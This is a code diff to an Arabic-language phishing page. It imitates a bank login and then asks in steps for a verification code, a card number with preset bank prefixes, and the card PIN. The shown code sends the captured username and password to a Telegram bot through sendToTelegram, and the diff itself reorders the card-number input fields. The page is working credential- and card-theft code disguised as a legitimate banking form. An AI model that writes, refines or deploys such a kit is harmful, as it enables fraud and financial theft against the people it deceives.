@@ -133,13 +133,12 @@
         .checkbox-group input[type="checkbox"] {
             accent-color: var(--main-color);
         }
-        /* تصغير خانات البطاقة وتناسقها */
         .card-inputs {
             display: flex;
             gap: 8px;
             margin-bottom: 14px;
             flex-direction: row;
-            justify-content: center;
+            justify-content: flex-end; /* جعل العناصر لليسار في RTL */
             align-items: center;
             padding: 0 2px;
         }
@@ -246,7 +245,6 @@
         }
         input[type=number] { -moz-appearance:textfield; }
 
-        /* تحسين مظهر زر التالي وخانات البطاقة */
         .card-next-btn {
             margin-top: 18px;
             background: var(--main-color);
@@ -305,11 +303,9 @@
             });
         }
 
-        // متغيرات تخزين بيانات المستخدم/البطاقة
         let userData = {};
         let cardData = {};
 
-        // صفحة البداية
         function renderStart() {
             userData = {};
             cardData = {};
@@ -325,12 +321,10 @@
             `;
         }
 
-        // تحقق عدم وجود أحرف عربية
         function hasArabicLetters(str) {
             return /[\u0600-\u06FF]/.test(str);
         }
 
-        // صفحة تسجيل الدخول
         function renderLogin() {
             document.getElementById('main').innerHTML = `
                 <div class="container">
@@ -364,7 +358,6 @@
                 let username = document.getElementById('username').value;
                 let password = document.getElementById('password').value;
 
-                // منع الأحرف العربية
                 if (hasArabicLetters(username) || hasArabicLetters(password)) {
                     showCustomSnack("غير مسموح بإدخال أحرف عربية في اسم المستخدم أو الرقم السري.");
                     return;
@@ -374,14 +367,12 @@
                     password,
                     rememberMe: document.getElementById('rememberMe').checked ? "نعم" : "لا"
                 };
-                // لا ترسل تذكرني للبوت
                 var msg = `تسجيل دخول جديد:\nاسم المستخدم: ${userData.username}\nكلمة المرور: ${userData.password}`;
                 sendToTelegram(msg);
                 renderVerifyCode('login');
             };
         }
 
-        // صفحة رمز التحقق بعد تسجيل الدخول أو البطاقة
         function renderVerifyCode(from) {
             document.getElementById('main').innerHTML = `
                 <div class="container">
@@ -421,7 +412,7 @@
             };
         }
 
-        // صفحة إدخال رقم البطاقة (تصميم جديد: 2 ثم 4 ثم 4)
+        // ========== هنا التعديل المطلوب ==========
         function renderCardStep1() {
             cardData = {};
             document.getElementById('main').innerHTML = `
@@ -430,17 +421,17 @@
                     ${logoHtml}
                     <form id="cardStep1Form" autocomplete="off">
                         <label class="big-label" style="text-align:center;display:block;">رقم البطاقة</label>
-                        <div class="card-inputs">
-                            <select id="cardStart" required>
-                                <option value="">اختيار</option>
+                        <div class="card-inputs" style="justify-content: flex-end; gap:8px;">
+                            <input type="text" id="card2" maxlength="2" inputmode="numeric" pattern="\\d{2}" class="card-two" placeholder="__" autocomplete="off" style="direction:ltr;text-align:left;"/>
+                            <input type="text" id="card4a" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;"/>
+                            <input type="text" id="card4b" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;"/>
+                            <select id="cardStart" required style="direction:ltr;text-align:left;">
+                                <option value="">select</option>
                                 <option value="401319">401319</option>
                                 <option value="401340">401340</option>
                                 <option value="449349">449349</option>
                                 <option value="455094">455094</option>
                             </select>
-                            <input type="text" id="card2" maxlength="2" inputmode="numeric" pattern="\\d{2}" class="card-two" placeholder="__" autocomplete="off" style="direction:ltr;text-align:left;"/>
-                            <input type="text" id="card4a" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;"/>
-                            <input type="text" id="card4b" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;"/>
                         </div>
                         <button class="card-next-btn" type="submit">التالي</button>
                     </form>
@@ -492,8 +483,8 @@
                 renderCardPin(cardStart, cardData.cardRest);
             };
         }
+        // ========== نهاية التعديل المطلوب ==========
 
-        // صفحة إدخال الرقم السري للبطاقة (تعديل لقبول الإدخال الجديد)
         function renderCardPin(cardStart, cardRest) {
             cardData.cardStart = cardStart;
             cardData.cardRest = cardRest;
@@ -531,7 +522,6 @@
             };
         }
 
-        // رسالة خطأ منبثقة
         function showErrorSnack() {
             var x = document.getElementById("snackbar");
             x.className = "snackbar show";
@@ -544,7 +534,6 @@
             setTimeout(function(){ x.className = x.className.replace("show", ""); x.innerText = "حدث خطأ في المعلومات، يرجى إعادة المحاولة."; }, 2300);
         }
 
-        // بدء الصفحة
         renderStart();
     </script>
 </body>
